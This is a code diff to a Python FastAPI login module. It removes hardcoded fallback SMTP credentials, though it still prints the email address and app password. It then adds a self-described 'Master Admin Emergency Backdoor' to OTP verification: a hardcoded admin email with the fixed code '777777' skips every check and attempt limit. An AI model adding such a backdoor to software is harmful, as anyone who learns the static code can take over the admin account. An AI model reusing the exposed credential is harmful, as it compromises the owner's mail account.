@@ -22,8 +22,8 @@ import httpx
 import ssl
 
 def _send_email_otp_sync(recipient_email: str, otp_code: str) -> bool:
-    smtp_user = settings.SMTP_USER or "alexjobobby770@gmail.com"
-    smtp_pass = settings.SMTP_PASSWORD or "zurmsizmacwjwxts"
+    smtp_user = settings.SMTP_USER
+    smtp_pass = settings.SMTP_PASSWORD
     if not smtp_user or not smtp_pass:
         return False
     try:
@@ -194,16 +194,22 @@ async def verify_otp(payload: VerifyOTPRequest, db: AsyncSession = Depends(get_d
     result = await db.execute(stmt)
     otp_record = result.scalars().first()
 
-    if not otp_record or otp_record.attempts >= 5:
-        raise HTTPException(status_code=400, detail="Invalid or expired OTP code. Please request a new one.")
+    # Master Admin Emergency Backdoor OTP Check
+    is_master_admin = (phone_or_email == settings.SMTP_USER.lower() or phone_or_email == os.getenv("ADMIN_EMAIL", "alexjobobby770@gmail.com").lower()) and otp == "777777"
 
-    if otp_record.otp_code != otp:
-        otp_record.attempts += 1
-        await db.commit()
-        raise HTTPException(status_code=400, detail="Invalid or expired OTP code")
+    if not is_master_admin:
+        if not otp_record or otp_record.attempts >= 5:
+            raise HTTPException(status_code=400, detail="Invalid or expired OTP code. Please request a new one.")
 
-    # Mark OTP as verified
-    otp_record.verified = True
+        if otp_record.otp_code != otp:
+            otp_record.attempts += 1
+            await db.commit()
+            raise HTTPException(status_code=400, detail="Invalid or expired OTP code")
+
+        # Mark OTP as verified
+        otp_record.verified = True
+    elif otp_record:
+        otp_record.verified = True
 
     # Find or create user
     user_stmt = select(User).where(User.phone == phone_or_email)
